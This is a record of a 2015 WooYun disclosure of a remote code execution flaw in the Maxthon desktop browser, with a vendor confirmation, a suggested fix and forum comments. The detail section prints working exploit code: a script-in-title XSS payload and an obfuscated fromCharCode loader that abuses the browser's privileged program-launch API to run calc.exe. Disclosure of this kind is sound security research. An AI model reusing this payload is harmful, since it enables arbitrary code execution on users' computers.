{"id": 44488, "wybug_id": "wooyun-2015-093544", "wybug_title": "傲游浏览器pc端远程代码执行", "wybug_corp": "傲游", "wybug_author": "梧桐雨", "wybug_date": "2015-01-23 16:14", "wybug_open_date": "2015-04-23 16:16", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["浏览器漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-23：\t细节向公众公开  简要描述： Remote command execution 详细说明：  傲游浏览器在设计的时候对关键的地方没有做过滤处理，导致res域下存在特权域的xss。结合前面研究过的案例是可以导致命令执行的。1、傲游浏览器在对访问过的网页title没有做处理，就带入到了网页当中：构造一个html如下：<title><script>alert(document.domain)</script></title>先访问一次，然后在打开新窗口的地方：\n\n随意打开一个新窗口：\n\n弹出了document.domain 是res，似乎我们可以做点什么。嗯结合二哥之前发布的 WooYun: 傲游浏览器远程命令执行漏洞二 以及Lyleaks发布的： WooYun: 傲游浏览器远程命令执行漏洞（Web端+客户端配合利用技巧） 我们不难构造代码，但是在构造代码的过程中，居然发现<script></script>这样不能直接执行，经过了无数次尝试，各种姿势都试过了，才发现通过引用外域<script src=\"1.js\"></script>可以达到调用任意exe的目的。   漏洞证明：  本地构造：mxrtc.js:\neval(String.fromCharCode(118,97,114,32,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,105,102,114,97,109,101,34,41,59,115,46,115,114,99,61,34,109,120,58,47,47,114,101,115,47,110,111,116,105,102,105,99,97,116,105,111,110,47,34,59,115,46,111,110,108,111,97,100,61,102,117,110,99,116,105,111,110,40,41,123,115,46,99,111,110,116,101,110,116,87,105,110,100,111,119,46,109,97,120,116,104,111,110,46,112,114,111,103,114,97,109,46,80,114,111,103,114,97,109,46,108,97,117,110,99,104,40,34,67,58,47,119,105,110,100,111,119,115,47,115,121,115,116,101,109,51,50,47,99,97,108,99,46,101,120,101,34,44,34,34,41,125,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59))\n先访问一次，然后再打开一个新窗口：\n\n\n\n哦，对了，是最新版：\n\n执行远程的命令，仅需要对external.mxCall对象做调用即可。前面例子很多了，不多说。。演示链接: http://pan.baidu.com/s/1kTBViT5 密码: ufks   修复方案：  对mx://res/quick-access/index.htm输出检查。过滤。   版权声明：转载请注明来源 梧桐雨@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-01-23 17:20 厂商回复： 新标签页安全漏洞 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-23 16:39 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  好厉害,么么哒    \n     2015-01-23 16:40 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  @瘦蛟舞 谢谢师傅 么么哒    \n     2015-01-23 17:04 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  么么哒    \n     2015-01-23 17:21 |    \t\t鬼五 \t\t\t( 普通白帽子  |\t\t\t        Rank:214 漏洞数:83        )\t\t \n  看着你们这些大V，我都不敢说话了，但还是要说一句：么么哒     \n     2015-01-23 17:38 |    \t\tLyleaks \t\t\t( 普通白帽子  |\t\t\t        Rank:137 漏洞数:9        | 这个人很聪明，什么也没有留下)\t\t \n  mark    \n     2015-01-23 17:41 |    \t\tLyleaks \t\t\t( 普通白帽子  |\t\t\t        Rank:137 漏洞数:9        | 这个人很聪明，什么也没有留下)\t\t \n  梧桐雨到底是姐姐还是哥哥。好大的悬念啊    \n     2015-01-27 19:35 |    \t\t新一葛格 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 啊累哇 滚筒洗衣机)\t\t \n  梧桐雨妹子，好厉害！    \n     2015-01-30 16:27 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  哇都是v了.    \n     2015-04-23 16:40 |    \t\t破锁 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:6        )\t\t \n  长见识了    \n     2015-04-23 16:41 |    \t\tganggang \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 这个号是来乌云聊天的....)\t\t \n  但是在构造代码的过程中，居然发现<script></script>这样不能直接执行，经过了无数次尝试，各种姿势都试过了，才发现原来自己真是个比较持久的男人....    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}